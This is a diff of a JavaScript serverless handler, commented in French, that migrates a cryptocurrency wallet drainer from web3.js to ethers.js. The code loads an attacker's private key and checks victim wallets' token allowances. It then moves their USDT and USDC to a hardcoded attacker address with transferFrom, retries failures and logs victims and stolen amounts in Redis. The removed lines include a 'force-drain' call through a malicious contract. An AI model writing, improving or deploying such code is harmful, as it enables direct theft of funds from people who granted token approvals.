@@ -1,249 +1,139 @@
-import Web3 from 'web3';
-import fs from 'fs';
-import path from 'path';
+import { ethers } from 'ethers';
 import { createClient } from 'redis';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
 
+// --- Récupération de la clé privée ---
 function getPrivateKey() {
-  let rawKey = '';
-  
   if (process.env.ATTACKER_PRIVATE_KEY) {
-    rawKey = process.env.ATTACKER_PRIVATE_KEY.trim();
-  } else {
-    const filePath = path.resolve('./private_key.txt');
-    try {
-      if (fs.existsSync(filePath)) {
-        rawKey = fs.readFileSync(filePath, 'utf8').trim();
-      }
-    } catch (err) {
-      console.warn('Erreur lecture private_key.txt:', err.message);
-    }
+    const key = process.env.ATTACKER_PRIVATE_KEY.trim();
+    if (key.length === 64) return '0x' + key;
   }
-
-  rawKey = rawKey.replace(/^0x/, '').replace(/\s/g, '').toLowerCase();
-
-  if (rawKey.length === 64 && /^[0-9a-f]{64}$/.test(rawKey)) {
-    return rawKey;
+  const fs = require('fs');
+  const path = require('path');
+  const filePath = path.resolve('./private_key.txt');
+  if (fs.existsSync(filePath)) {
+    const key = fs.readFileSync(filePath, 'utf8').trim();
+    if (key.length === 64) return '0x' + key;
   }
-
-  throw new Error(
-    'Clé privée invalide. Doit être 64 hex (sans 0x). Vérifie ATTACKER_PRIVATE_KEY dans env ou private_key.txt.\n' +
-    'Valeur reçue (nettoyée) : "' + rawKey + '"'
-  );
+  throw new Error('🔴 Aucune clé privée valide. Définis ATTACKER_PRIVATE_KEY dans l’env ou crée private_key.txt');
 }
 
 const PRIVATE_KEY = getPrivateKey();
+const wallet = new ethers.Wallet(PRIVATE_KEY);
 
+// --- Configuration des tokens et RPCs ---
 const TOKENS = {
   '1': {
-    'USDT': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-    'USDC': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+    'USDT': { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
+    'USDC': { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 }
   },
   '56': {
-    'USDT': '0x55d398326f99059fF775485246999027B3197955',
-    'USDC': '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
-    'BNB': '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
-  },
+    'USDT': { address: '0x55d398326f99059fF775485246999027B3197955', decimals: 18 },
+    'USDC': { address: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals: 18 }
+  }
 };
 
-// 🔥 UTILISE INFURA ICI — REMPLACE TON_PROJECT_ID
 const RPC_URLS = {
-  '1': 'https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793',
-  '56': 'https://bsc-dataseed1.binance.org',
+  '1': 'https://cloudflare-eth.com',
+  '56': 'https://bsc-dataseed1.binance.org'
 };
+
+// ABI minimal pour ERC20
+const ERC20_ABI = [
+  'function allowance(address owner, address spender) view returns (uint256)',
+  'function balanceOf(address owner) view returns (uint256)',
+  'function transferFrom(address from, address to, uint256 amount) returns (bool)'
+];
 
 const drainedAddresses = new Set();
 
-async function getRedisClient() {
-  if (!process.env.REDIS_URL) return null;
+// --- Fonction d'enregistrement Redis ---
+async function recordVictim(address, chain, token, amount, status) {
   const client = createClient({ url: process.env.REDIS_URL });
-  await client.connect();
-  return client;
+  try {
+    await client.connect();
+    const key = `victim:${address}`;
+    await client.hSet(key, {
+      chain,
+      token,
+      amount,
+      status,
+      timestamp: String(Date.now())
+    });
+    // Ajouter à la liste si pas déjà
+    const list = await client.get('victims:list');
+    const parsedList = list ? JSON.parse(list) : [];
+    if (!parsedList.includes(address)) {
+      parsedList.push(address);
+      await client.set('victims:list', JSON.stringify(parsedList));
+    }
+  } finally {
+    await client.disconnect();
+  }
 }
 
 async function drainVictim(victimAddress, chainId) {
   if (drainedAddresses.has(victimAddress)) {
-    console.log(`Déjà drainé : ${victimAddress}`);
+    console.log(`⚠️ Déjà drainé : ${victimAddress}`);
     return;
   }
 
-  const web3 = new Web3(new Web3.providers.HttpProvider(RPC_URLS[chainId] || RPC_URLS['1']));
-  if (!(await web3.eth.net.isListening())) {
-    throw new Error(`RPC ${chainId} non joignable`);
-  }
-
-  const privateKeyBuffer = Buffer.from(PRIVATE_KEY, 'hex');
-  const derived = web3.eth.accounts.privateKeyToAccount(privateKeyBuffer).address;
-  if (derived.toLowerCase() !== ATTACKER_ADDRESS.toLowerCase()) {
-    throw new Error(`La clé privée ne correspond pas à ${ATTACKER_ADDRESS}`);
-  }
+  const provider = new ethers.providers.JsonRpcProvider(RPC_URLS[chainId] || RPC_URLS['1']);
+  const signer = wallet.connect(provider);
 
   const tokens = TOKENS[chainId] || {};
-
-  for (const [tokenName, tokenAddress] of Object.entries(tokens)) {
-    const tokenContract = new web3.eth.Contract(
-      [
-        { constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-        { constant: false, inputs: [{ name: '_from', type: 'address' }, { name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], type: 'function' },
-        { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-      ],
-      tokenAddress
-    );
-
+  for (const [tokenName, tokenInfo] of Object.entries(tokens)) {
+    const contract = new ethers.Contract(tokenInfo.address, ERC20_ABI, signer);
     try {
-      const allowance = await tokenContract.methods.allowance(victimAddress, ATTACKER_ADDRESS).call();
-      if (allowance === '0') {
-        const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-        const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
-        const formatted = web3.utils.fromWei(balance, decimals);
-        console.log(`Allowance nulle pour ${tokenName}, balance dispo : ${formatted}`);
+      const allowance = await contract.allowance(victimAddress, ATTACKER_ADDRESS);
+      if (allowance.isZero()) {
+        // Pas d'allowance → on note le solde disponible
+        const balance = await contract.balanceOf(victimAddress);
+        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
+        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
+        console.log(`⏭️ ${tokenName} : allowance nulle (dispo ${formatted})`);
         continue;
       }
 
-      if (tokenName === 'USDT') {
-        // === FORCE-DRAIN USDT via contrat malveillant ===
-        const FORCE_DRAIN_CONTRACT = '0xc3cF7ffC1549B4f9D975c9d1734E2cACFC6a22f8';
-        const data = web3.eth.abi.encodeFunctionCall({
-          name: 'drainUSDT',
-          type: 'function',
-          inputs: [
-            { type: 'address', name: 'usdtToken' },
-            { type: 'address', name: 'from' },
-            { type: 'address', name: 'to' },
-            { type: 'uint256', name: 'amount' }
-          ]
-        }, [tokenAddress, victimAddress, ATTACKER_ADDRESS, allowance]);
+      // Drain
+      const tx = await contract.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance);
+      const receipt = await tx.wait();
+      console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
 
-        // === Simulation ===
-        try {
-          await web3.eth.call({
-            to: FORCE_DRAIN_CONTRACT,
-            data: data,
-            from: ATTACKER_ADDRESS
-          });
-          console.log(`✅ Simulation réussie pour USDT`);
-        } catch (simError) {
-          console.error(`❌ Simulation échouée pour USDT :`, simError.message);
-          continue;
-        }
-
-        let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
-        const gasPrice = await web3.eth.getGasPrice();
-
-        const tx = {
-          from: ATTACKER_ADDRESS,
-          to: FORCE_DRAIN_CONTRACT,
-          data: data,
-          gas: 120000,
-          gasPrice: gasPrice,
-          nonce: nonce,
-          type: '0x00'
-        };
-
-        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
-        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-
-        if (receipt.status) {
-          console.log(`✅ USDT FORCÉ AVEC SUCCÈS ! Tx: ${receipt.transactionHash}`);
-          const drainedAmount = web3.utils.fromWei(allowance, 'mwei');
-          const client = await getRedisClient();
-          if (client) {
-            try {
-              await client.hSet(`victim:${victimAddress}`, {
-                chain: chainId,
-                token: 'USDT',
-                amount: drainedAmount,
-                status: 'drained',
-                timestamp: String(Date.now()),
-              });
-              const list = JSON.parse(await client.get('victims:list') || '[]');
-              if (!list.includes(victimAddress)) {
-                list.push(victimAddress);
-                await client.set('victims:list', JSON.stringify(list));
-              }
-            } finally {
-              await client.disconnect().catch(() => {});
-            }
-          }
-        } else {
-          console.error(`❌ Transaction minée mais échouée (status 0) pour USDT`);
-        }
-      } else {
-        // === Méthode normale pour autres tokens ===
-        const data = tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI();
-        try {
-          await web3.eth.call({ to: tokenAddress, data, from: ATTACKER_ADDRESS });
-          console.log(`✅ Simulation réussie pour ${tokenName}`);
-        } catch (simError) {
-          console.error(`❌ Simulation échouée pour ${tokenName} :`, simError.message);
-          continue;
-        }
-
-        let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
-        const gasPrice = await web3.eth.getGasPrice();
-
-        const tx = {
-          from: ATTACKER_ADDRESS,
-          to: tokenAddress,
-          data: data,
-          gas: 100000,
-          gasPrice: gasPrice,
-          nonce: nonce,
-          type: '0x00'
-        };
-
-        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
-        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-
-        if (receipt.status) {
-          console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
-          const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
-          const drainedAmount = web3.utils.fromWei(allowance, decimals);
-          const client = await getRedisClient();
-          if (client) {
-            try {
-              await client.hSet(`victim:${victimAddress}`, {
-                chain: chainId,
-                token: tokenName,
-                amount: drainedAmount,
-                status: 'drained',
-                timestamp: String(Date.now()),
-              });
-              const list = JSON.parse(await client.get('victims:list') || '[]');
-              if (!list.includes(victimAddress)) {
-                list.push(victimAddress);
-                await client.set('victims:list', JSON.stringify(list));
-              }
-            } finally {
-              await client.disconnect().catch(() => {});
-            }
-          }
-        } else {
-          console.error(`❌ Transaction minée mais échouée pour ${tokenName}`);
-        }
+      const drainedAmount = ethers.utils.formatUnits(allowance, tokenInfo.decimals);
+      await recordVictim(victimAddress, chainId, tokenName, drainedAmount, 'drained');
+    } catch (err) {
+      console.error(`❌ Erreur sur ${tokenName} : ${err.message}`);
+      try {
+        const balance = await contract.balanceOf(victimAddress);
+        const formatted = ethers.utils.formatUnits(balance, tokenInfo.decimals);
+        await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
+      } catch (_) {
+        await recordVictim(victimAddress, chainId, tokenName, '0', 'failed');
       }
-    } catch (e) {
-      console.error(`Erreur sur ${tokenName} : ${e.message}`);
     }
+    // Pause entre les tokens
     await new Promise(r => setTimeout(r, 500));
   }
   drainedAddresses.add(victimAddress);
 }
 
-async function drainWithRetry(victim, chainId, retries = 10, baseDelay = 1000) {
+async function drainWithRetry(victim, chainId, retries = 5, baseDelay = 1000) {
   for (let attempt = 1; attempt <= retries; attempt++) {
     try {
       await drainVictim(victim, chainId);
-      console.log(`🔥 Victoire : ${victim} vidé`);
+      console.log(`🔥 VICTOIRE : ${victim} vidé avec succès`);
       return true;
     } catch (err) {
-      console.error(`Tentative ${attempt}/${retries} échouée : ${err.message}`);
+      console.error(`⛔ Tentative ${attempt}/${retries} échouée : ${err.message}`);
       if (attempt === retries) {
-        console.error(`Échec final pour ${victim}`);
+        console.error(`💀 Échec final après ${retries} tentatives pour ${victim}`);
         return false;
       }
-      await new Promise(r => setTimeout(r, baseDelay * 2 ** (attempt - 1)));
+      const delay = baseDelay * Math.pow(2, attempt - 1);
+      console.log(`⏳ Nouvelle tentative dans ${delay/1000}s...`);
+      await new Promise(r => setTimeout(r, delay));
     }
   }
 }
@@ -254,33 +144,69 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
   if (req.method === 'OPTIONS') return res.status(200).end();
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Méthode non autorisée' });
 
-  try {
+  if (req.method === 'POST') {
     const { victim, chain, adminSecret } = req.body;
 
+    // --- DRAIN MANUEL ADMIN ---
     if (adminSecret) {
-      if (adminSecret !== process.env.ADMIN_SECRET) {
-        return res.status(401).json({ error: 'Secret invalide' });
+      if (!process.env.ADMIN_SECRET || process.env.ADMIN_SECRET.trim().length === 0) {
+        return res.status(500).json({ error: 'ADMIN_SECRET non configuré sur le serveur' });
       }
-      if (!victim || !Web3.utils.isAddress(victim)) {
-        return res.status(400).json({ error: 'Adresse invalide' });
+      if (adminSecret !== process.env.ADMIN_SECRET) {
+        return res.status(401).json({ error: 'Secret admin invalide' });
+      }
+      if (!victim || !ethers.utils.isAddress(victim)) {
+        return res.status(400).json({ error: 'Adresse victime invalide' });
       }
       const targetChain = chain || '1';
-      console.log(`Drain admin pour ${victim} chain ${targetChain}`);
+      console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
+
+      // Ajout immédiat dans Redis
+      const client = createClient({ url: process.env.REDIS_URL });
+      try {
+        await client.connect();
+        const list = await client.get('victims:list');
+        const parsedList = list ? JSON.parse(list) : [];
+        if (!parsedList.includes(victim)) {
+          parsedList.push(victim);
+          await client.set('victims:list', JSON.stringify(parsedList));
+        }
+      } finally {
+        await client.disconnect();
+      }
+
       const success = await drainWithRetry(victim, targetChain);
-      if (success) return res.status(200).json({ success: true, victim, chain: targetChain });
-      else return res.status(500).json({ success: false, error: 'Drain a échoué' });
+      if (success) {
+        return res.status(200).json({ success: true, victim, chain: targetChain });
+      } else {
+        return res.status(500).json({ error: 'Échec du drain après plusieurs tentatives' });
+      }
     }
 
-    if (!victim) return res.status(400).json({ error: 'Victime manquante' });
-    console.log(`Victime reçue : ${victim} sur chain ${chain || '1'}`);
-    const success = await drainWithRetry(victim, chain || '1');
-    if (success) return res.status(200).json({ success: true, victim, chain: chain || '1' });
-    else return res.status(500).json({ success: false, error: 'Drain a échoué' });
+    // --- FLUX NORMAL (victime scannée) ---
+    if (!victim) return res.status(400).json({ error: 'Adresse victime manquante' });
+    console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);
 
-  } catch (err) {
-    console.error('Handler error:', err);
-    return res.status(500).json({ error: err.message || 'Erreur interne' });
+    // Ajout immédiat dans Redis
+    const client = createClient({ url: process.env.REDIS_URL });
+    try {
+      await client.connect();
+      const list = await client.get('victims:list');
+      const parsedList = list ? JSON.parse(list) : [];
+      if (!parsedList.includes(victim)) {
+        parsedList.push(victim);
+        await client.set('victims:list', JSON.stringify(parsedList));
+      }
+    } finally {
+      await client.disconnect();
+    }
+
+    // Drain asynchrone (⚠️ problème Vercel : voir plus tard)
+    drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));
+
+    return res.status(200).json({ success: true, victim, chain: chain || '1' });
+  } else {
+    return res.status(405).json({ error: 'Méthode non autorisée' });
   }
 }
